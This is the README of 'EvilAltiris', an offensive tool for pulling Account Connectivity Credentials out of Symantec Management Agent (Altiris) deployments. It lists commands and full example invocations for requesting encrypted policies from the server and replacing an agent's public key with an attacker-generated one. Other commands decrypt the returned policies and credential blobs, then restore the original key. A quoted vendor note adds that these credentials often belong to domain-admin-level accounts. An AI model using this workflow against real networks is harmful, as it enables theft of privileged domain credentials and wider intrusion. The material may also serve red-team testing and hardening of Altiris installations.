# EvilAltiris

Tool for extracting Account Connectivity Credentials (ACCs) from Symantec Management Agent (Altiris) in a default configuration. This tool supports two modes of operation, one from an elevated (SYSTEM) process and another from a low privileged (domain user) process. 

```
Usage: EvilAltiris <command> <args>

SMATool Commands (requires elevation and SMATool.exe on disk):

SmaGetPublicKey         -       Return the current public key value for the agent from the LDB
SmaGetTypeGuid          -       Fetch the type GUID from a machine joined to Altiris (requires elevation and SMATool.exe on disk)
SmaDecrypt              -       Decrypt encrypted policy data or ACC (requires elevation and SMATool.exe on disk)

Generic Commands (no elevation or SMATool.exe required):

GetClientPolicies       -       Request encrypted policies from Altiris server
GetMachineGuid          -       Read the current machineGuid value from the registry
GenerateKeys            -       Generate a new public / private key pair and policyKey blob
SetPublicKey            -       Overwrite the public key (policyKey) value for an existing machineGuid
DecryptPolicy           -       Decrypt encrypted policy data with private key XML
DecryptAcc              -       Decrypt an encrypted Account Connectivity Credential (ACC) blob
RestoreAgent            -       Force the agent to make a request to CreateResource.aspx to restore the existing agent public key

Arguments:

/smapath        -       Path to SMATool.exe on disk for any SMATool commands
/url            -       Notification Server target including the protocol e.g http://server.local
/key            -       XML string representing a private key for decryption or policyKey value
/data           -       Data to decrypt, can be either a file on disk containing binary data or a base64 string
/machine        -       Machine Guid for the agent
/type           -       Type Guid for the agent
/outfile        -       (Optional) outfile for the returned data

Example usage:

EvilAltiris.exe SmaGetPublicKey /smatool:C:\tools\smatool.exe
EvilAltiris.exe SmaGetTypeGuid /smatool:C:\tools\smatool.exe
EvilAltiris.exe SmaDecrypt /smatool:C:\tools\smatool.exe /data:AAA4xIqgq7WOIYvNqAXSaxh

EvilAltiris.exe GetClientPolicies /url:http://altiris.local /machine:{C07989E4-5473-4856-9752-8907FFCC506A} /type:{493435F7-3B17-4C4C-B07F-C23E7AB7781F}
EvilAltiris.exe GetMachineGuid
EvilAltiris.exe GenerateKeys
EvilAltiris.exe SetPublicKey /key:AAA4xIqgq7WOIYvNqAXSaxh /url:http://altiris.local /machine:{C07989E4-5473-4856-9752-8907FFCC506A}
EvilAltiris.exe DecryptPolicy /key:<RSAKeyValue><Modulus>3F7JlI</D></RSAKeyValue> /data:encrypted_policy.dat
EvilAltiris.exe DecryptAcc /data:AAA4xIqgq7WOIYvNqAXSaxh
EvilAltiris.exe RestoreAgent
```

# References
https://knowledge.broadcom.com/external/article?legacyId=HOWTO77271
```"By default the ACC is set to the Application Identity account (NS Installer account). Since the SMP installer account is usually an account with a high level of rights such as a domain admin, best practice is to change this to a low level user account."```
